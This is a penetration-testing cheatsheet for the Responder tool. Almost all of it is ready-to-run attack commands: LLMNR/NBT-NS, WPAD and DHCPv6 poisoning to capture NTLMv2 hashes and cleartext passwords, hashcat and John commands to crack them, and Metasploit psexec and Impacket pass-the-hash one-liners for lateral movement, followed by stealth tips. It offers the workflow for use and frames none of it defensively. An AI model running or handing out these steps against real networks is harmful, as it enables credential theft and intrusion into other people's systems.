# Responder Cheatsheet

## Quick Reference

### Basic Poisoning

```bash
# Standard LLMNR/NBT-NS poisoning
sudo responder -I eth0 -v

# Analyze mode (passive monitoring)
sudo responder -I eth0 -A -v
```

### DHCPv6 Attack

```bash
# Edit Responder.conf first:
# [DHCPv6 Server]
# DHCPv6_Domain = corp.local

sudo responder -I eth0 --dhcpv6 -v
```

### Force HTTP Basic Auth

```bash
sudo responder -I eth0 -b -v
```

### WPAD Proxy Attack

```bash
sudo responder -I eth0 -w -v
```

### Force Proxy Auth + Rogue DHCP

```bash
sudo responder -I eth0 -P -d -v
```

### All Interfaces

```bash
sudo responder -I ALL -v
```

### Verbose Output

```bash
sudo responder -I eth0 -vv
```

### Quiet Mode

```bash
sudo responder -I eth0 -Q -v
```

### Custom TTL

```bash
sudo responder -I eth0 -t 1e -v
```

### External IP Poisoning

```bash
sudo responder -I eth0 -e 10.0.0.22 -v
```

### Complete Attack Setup

```bash
# 1. Start Responder
sudo responder -I eth0 -v

# 2. Capture credentials (monitor output)

# 3. Crack NTLMv2 hashes
hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt
```

### WPAD Attack

```bash
# 1. Start with WPAD
sudo responder -I eth0 -w -v

# 2. Force authentication
sudo responder -I eth0 -w -P -v
```

### DHCPv6 + DNS Attack

```bash
# 1. Configure Responder.conf
# [DHCPv6 Server]
# DHCPv6_Domain = corp.local

# 2. Start attack
sudo responder -I eth0 --dhcpv6 -v
```

## Command Options

| Option | Description |
|--------|-------------|
| `-I INTERFACE` | Network interface |
| `-A, --analyze` | Analyze mode (passive) |
| `-w, --wpad` | WPAD rogue proxy |
| `-P, --ProxyAuth` | Force proxy authentication |
| `-v, --verbose` | Verbose output |
| `-Q, --quiet` | Quiet mode |
| `-d, --DHCP` | DHCP broadcast responses |
| `-D, --DHCP-DNS` | Inject DNS in DHCP response |
| `--dhcpv6` | DHCPv6 poisoning |
| `-e IP, --externalip=IP` | Poison with external IP |
| `-b, --basic` | HTTP Basic authentication |
| `-t TTL, --ttl=TTL` | Change TTL for poisoned answers |

## Configuration File

### Responder.conf

```ini
[Responder Core]
; Servers to start
SQL = On
SMB = On
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
IMAPS = On
HTTP = On
HTTPS = On
DNS = On
LDAP = On
DCERPC = On
WINRM = On

; Poisoners
LLMNR = On
NBTNS = On
MDNS = On
DHCP = Off
DHCPv6 = On

; Settings
SessionLog = On
LogToFile = On
Verbose = Yes
Database = Responder.db

; SSL Certificates
SSLCert = certs/responder.crt
SSLKey = certs/responder.key

[DHCPv6 Server]
DHCPv6_Domain = corp.local
SendRA = Off
BindToIPv6 = fe80::1
```

## Captured Data Formats

### NTLMv2 Hash

```
username::domain:challenge:response:blob
```

**Example**:
```
john::WORKGROUP:1122334455667788:A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4:010100000000000080A1B2C3D4E5F6000000000000000000000000000000000000000000000000000000000000000000
```

### Kerberos AS-REQ Hash

```
username:challenge:response
```

### Cleartext Credentials

```
[HTTP] Basic: user:Password123
[FTP] Cleartext: user:Password123
[SMTP] LOGIN: user@company.com:Password123
```

## Common Workflows

### Capture and Crack NTLMv2

```bash
# 1. Start Responder
sudo responder -I eth0 -v

# 2. Wait for NTLMv2 hash capture
# [SMB] NTLMv2-SSP Hash: ...

# 3. Save hash to file
echo "john::WORKGROUP:1122334455667788:A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4:..." > hash.txt

# 4. Crack with hashcat
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

# 5. Or crack with John
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### WPAD Attack

```bash
# 1. Start with WPAD
sudo responder -I eth0 -w -v

# 2. Force authentication
sudo responder -I eth0 -w -P -v

# 3. Capture NTLMv2 hash
```

### DHCPv6 + DNS Attack

```bash
# 1. Configure Responder.conf
# Set DHCPv6_Domain = target.local

# 2. Start attack
sudo responder -I eth0 --dhcpv6 -v

# 3. Capture credentials
```

### Stealth Attack

```bash
# 1. Analyze mode first
sudo responder -I eth0 -A -v

# 2. Enable poisoning when ready
sudo responder -I eth0 -v

# 3. Use quiet mode
sudo responder -I eth0 -Q -v
```

## Integration with Other Tools

### Hashcat Integration

```bash
# Save NTLMv2 hash
echo "john::WORKGROUP:1122334455667788:A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4:..." > hash.txt

# Crack with hashcat (NTLMv2 = mode 5600)
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

### John the Ripper Integration

```bash
# Save NTLMv2 hash
echo "john::WORKGROUP:1122334455667788:A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4:..." > hash.txt

# Crack with John
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### Metasploit Integration

```bash
# Use captured credentials
msfconsole -q -x "use exploit/windows/smb/psexec; set RHOSTS 192.168.1.100; set SMBUser administrator; set SMBPass password123; exploit"
```

### Impacket Integration

```bash
# Pass-the-hash
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:cc36cf7a8514893efccd332446158b1a administrator@192.168.1.100
```

## Troubleshooting

### Common Errors

**"No credentials captured"**:
```bash
ip a
sudo netstat -tulpn | grep -E "445|80|389|88"
sudo systemctl stop smbd nmbd
```

**"Permission denied"**:
```bash
sudo responder -I eth0 -v
```

**"Interface not found"**:
```bash
ip link show
sudo responder -I wlan0 -v
```

**"Port already in use"**:
```bash
sudo netstat -tulpn | grep 445
sudo systemctl stop smbd nmbd
```

**"DHCPv6 not working"**:
```bash
sudo sysctl -w net.ipv6.conf.all.disable_ipv6=0
sysctl net.ipv6.conf.all.disable_ipv6
```

## OpSec Tips

1. **Use analyze mode**: Monitor without poisoning
2. **Enable services selectively**: Only enable what you need
3. **Use quiet mode**: Reduce noise
4. **Log everything**: Use SQLite database for evidence
5. **Crack hashes offline**: Use hashcat or John

## Resources

- **GitHub**: https://github.com/lgandx/Responder
- **Kali Docs**: https://www.kali.org/tools/responder/
